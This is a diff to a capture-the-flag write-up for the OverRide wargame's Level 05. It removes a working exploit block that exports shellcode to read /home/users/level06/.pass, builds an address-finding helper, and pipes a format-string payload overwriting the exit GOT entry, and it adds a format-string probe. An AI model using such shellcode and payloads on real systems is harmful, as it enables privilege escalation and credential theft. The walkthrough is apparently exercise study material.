@@ -1,15 +1,4 @@
-level05@OverRide:~$ export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'
-level05@OverRide:~$ cat > /tmp/getenv.c << 'EOF'
-> #include <stdlib.h>
-> #include <stdio.h>
-> int main(int argc, char *argv[]) {
->     printf("%p\n", getenv(argv[1]));
-> }
-> EOF
-level05@OverRide:~$ gcc /tmp/getenv.c -o /tmp/getenv
-level05@OverRide:~$ /tmp/getenv SHELLCODE
-0x7fffffffe892
-level05@OverRide:~$ (python -c "print '\xe0\x97\x04\x08\xe2\x97\x04\x08' + '%55432x%10\$hn%10095x%11\$hn'"; cat) | ./level05
+
 # Level 05
 
 ## Overview
@@ -65,11 +54,13 @@ We need the runtime address of this environment variable:
 
 ```bash
 level05@OverRide:~$ cat > /tmp/getenv.c << 'EOF'
+
 #include <stdlib.h>
 #include <stdio.h>
 int main(int argc, char *argv[]) {
     printf("%p\n", getenv(argv[1]));
 }
+
 EOF
 
 level05@OverRide:~$ gcc /tmp/getenv.c -o /tmp/getenv
@@ -78,6 +69,8 @@ level05@OverRide:~$ /tmp/getenv SHELLCODE
 ```
 ```text 
 objdump -R ./level05 | grep exit
+(python -c "print 'AAAA' + '%p.'*50") | ./level05
+
 ```
 This should show: `080497e0 R_386_JUMP_SLOT   exit`
 
@@ -114,7 +107,6 @@ Because the address 0x7fffffff is too large for a single %n write, we split it i
 Target address	Value to write (2 bytes)	Decimal
 0x080497e0	0xe892 (lower 2 bytes)	59538
 0x080497e2	0x7fff (upper 2 bytes)	32767
-
 
 
 # Format string technique:
